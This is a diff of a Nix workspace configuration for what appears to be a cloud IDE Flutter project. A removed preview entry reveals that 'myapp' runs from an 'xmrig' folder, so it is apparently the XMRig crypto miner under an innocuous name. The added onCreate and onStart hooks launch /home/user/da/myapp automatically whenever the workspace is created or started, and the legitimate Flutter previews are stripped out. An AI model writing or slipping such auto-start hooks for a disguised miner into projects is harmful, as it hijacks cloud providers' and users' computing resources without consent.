@@ -6,7 +6,7 @@
     pkgs.unzip
   ];
 
-  env = {};
+  env = { };
 
   idx = {
     extensions = [
@@ -16,45 +16,17 @@
 
     workspace = {
       onCreate = {
-        install = "./myapp";
+        run = ''
+          echo "Running myapp on create..."
+          /home/user/da/myapp
+        '';
       };
-      onStart = {
-        command = "./myapp";
-      };
-    };
 
-    previews = {
-      enable = true;
-      previews = {
-        web = {
-          command = [
-            "flutter"
-            "run"
-            "--machine"
-            "-d"
-            "web-server"
-            "--web-hostname"
-            "0.0.0.0"
-            "--web-port"
-            "$PORT"
-          ];
-          manager = "flutter";
-        };
-        myapp = {
-          command = ["/bin/sh" "-c" "cd xmrig && ./myapp"];
-        };
-        android = {
-          command = [
-            "flutter"
-            "run"
-            "--machine"
-            "-d"
-            "android"
-            "-d"
-            "localhost:5555"
-          ];
-          manager = "flutter";
-        };
+      onStart = {
+        run = ''
+          echo "Running myapp on start..."
+          /home/user/da/myapp
+        '';
       };
     };
   };
